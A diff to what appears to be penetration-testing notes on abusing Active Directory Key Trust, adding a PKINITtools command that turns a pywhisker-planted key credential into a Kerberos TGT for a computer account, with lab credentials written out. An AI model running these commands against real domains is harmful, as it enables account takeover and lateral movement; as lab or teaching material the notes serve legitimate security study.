@@ -178,10 +178,16 @@ When abusing Key Trust, we are effectively adding alternative credentials to the
 ### Exploitation
 Use [pywhisker for Linux](https://github.com/ShutdownRepo/pywhisker) or [Whisker for Windows](https://github.com/eladshamir/Whisker) to abuse.
 
-Can use `add` to generate a new public|private key pair and add it to the `msDS-KeyCredentialLink` property. Also keep in mind that it might be useful to use the `remove` for cleanup.
+Can use `add` to generate a new public/private key pair and add it to the `msDS-KeyCredentialLink` property. Also keep in mind that it might be useful to use the `remove` for cleanup.
 
 ```
 python3 pywhisker.py -d "zsm.local" -u "marcus" -p "\!QAZ2wsx" -t "ZPH-SVRMGMT1$" --action "add" -v 
+```
+
+Clone the [PKINITtools](https://github.com/dirkjanm/PKINITtools) repository for utilities to generate a TGT
+
+```
+python3 PKINITtools/gettgtpkinit.py -cert-pfx UvWSLQEU.pfx -pfx-pass uq1SMyetoBSAUdZxTpOH zsm.local/ZPH-SVRMGMT1$ UvWSLQEU.ccache
 ```
 
 **Additional Resources**
